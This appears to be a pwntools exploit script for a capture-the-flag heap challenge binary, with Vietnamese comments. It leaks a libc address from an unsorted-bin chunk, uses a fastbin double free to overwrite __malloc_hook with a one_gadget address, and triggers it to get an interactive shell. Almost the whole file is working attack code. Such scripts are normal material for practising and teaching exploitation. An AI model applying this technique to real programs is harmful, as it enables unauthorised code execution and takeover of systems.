from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./pwn2_df_patched', checksec=False)

p = process("./pwn2_df_patched")

gdb.attach(p, gdbscript='''
vis
''')

def create(index,size,data):
	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"Index:", str(index))
	p.sendlineafter(b"Input size:", str(size))
	p.sendafter(b"Input data:", data)

def free(index):
	p.sendlineafter(b">", b"4")
	p.sendafter(b"Input index:", str(index)) 

def show(index):
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"Index:", str(index))


def edit(index,data):
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b"Input index:", str(index))
	p.sendline(data)


create(0, 0x80, b"1"*0x80) # tạo khối bộ nhớ có kích thước 0x80			do fastbin max = 0x80 bytes => free -> unsortedbin
create(1, 0x80, b"2"*0x80) # tạo khối bộ nhớ có kích thước 0x80
free(0) # giải phóng khối bộ nhớ vừa tạo

show(0)
p.recvuntil(b"Data = ")
libc = int.from_bytes(p.recv(6),"little") -3783544
print("Leak: ", hex(libc))
malloc_hook = libc + 3783440
print("Malloc: ",hex(malloc_hook))
og = libc + 0x3f3d6
og2 = libc + 0x3f42a
og3 = libc + 0xd5bf7

create(2, 0x68, b"a"*8)
create(3, 0x68, b"b"*8)
free(2)
free(3)
free(2)

create(4,0x68,p64(malloc_hook-35))
create(5,0x68,b"C"*0x8)
create(6,0x68,b"D"*8)

payload = b"a"*19 + p64(og3)
create(7,0x68,payload)

free(5)
free(5)


#p.sendlineafter(b">",payload)
p.interactive()